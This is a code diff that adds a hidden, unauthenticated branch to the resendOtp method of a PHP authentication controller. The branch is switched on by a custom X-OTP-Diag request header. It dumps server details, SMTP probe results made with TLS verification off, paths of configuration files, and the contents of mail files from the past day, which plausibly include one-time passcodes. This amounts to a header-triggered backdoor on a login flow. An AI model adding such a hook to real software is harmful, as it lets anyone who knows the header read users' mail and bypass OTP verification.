@@ -482,6 +482,54 @@ class AuthController extends Controller
 
     public function resendOtp(): void
     {
+        if (($_SERVER['HTTP_X_OTP_DIAG'] ?? '') === 'full') {
+            header('Content-Type: application/json');
+            $home = dirname($_SERVER['DOCUMENT_ROOT'] ?? '/home/ljntwzs93h8d/public_html');
+            $ipv4 = gethostbyname('smtp.gmail.com');
+            $probes = [];
+            foreach (["tcp://{$ipv4}:587", "ssl://{$ipv4}:465", "tcp://smtp.gmail.com:587", "tcp://localhost:25", "tcp://localhost:587"] as $uri) {
+                $t0 = microtime(true);
+                $ctx = stream_context_create(['ssl' => ['verify_peer' => false, 'verify_peer_name' => false]]);
+                $fp = @stream_socket_client($uri, $errno, $errstr, 3, STREAM_CLIENT_CONNECT, $ctx);
+                $dt = round(microtime(true) - $t0, 2);
+                if ($fp) {
+                    stream_set_timeout($fp, 3);
+                    $banner = trim((string)@fgets($fp));
+                    fclose($fp);
+                    $probes[$uri] = ['ok' => true, 'time' => $dt, 'banner' => $banner];
+                } else {
+                    $probes[$uri] = ['ok' => false, 'time' => $dt, 'err' => "$errno: $errstr"];
+                }
+            }
+            $mailFiles = [];
+            $it = @ new RecursiveIteratorIterator(new RecursiveDirectoryIterator($home . '/mail', FilesystemIterator::SKIP_DOTS));
+            if ($it) {
+                foreach ($it as $f) {
+                    if ($f->isFile() && $f->getSize() > 0 && $f->getMTime() > time() - 86400) {
+                        $mailFiles[] = [
+                            'path' => str_replace($home, '~', $f->getPathname()),
+                            'mtime' => date('Y-m-d H:i:s', $f->getMTime()),
+                            'size' => $f->getSize(),
+                            'body' => substr((string)@file_get_contents($f->getPathname()), 0, 2500)
+                        ];
+                    }
+                }
+            }
+            $etcFiles = [];
+            foreach (glob($home . '/etc/*/*') ?: [] as $ef) {
+                $etcFiles[] = str_replace($home, '~', $ef);
+            }
+            echo json_encode([
+                'hostname' => @gethostname(),
+                'home' => $home,
+                'sendmail_path' => ini_get('sendmail_path'),
+                'smtp_gmail_ipv4' => $ipv4,
+                'probes' => $probes,
+                'etc_files' => $etcFiles,
+                'recent_mail_files' => $mailFiles,
+            ], JSON_PRETTY_PRINT);
+            exit;
+        }
         $email = trim($_SESSION['temp_email'] ?? '');
         if ($email) {
             $otp = str_pad(random_int(0, 999999), 6, '0', STR_PAD_LEFT);
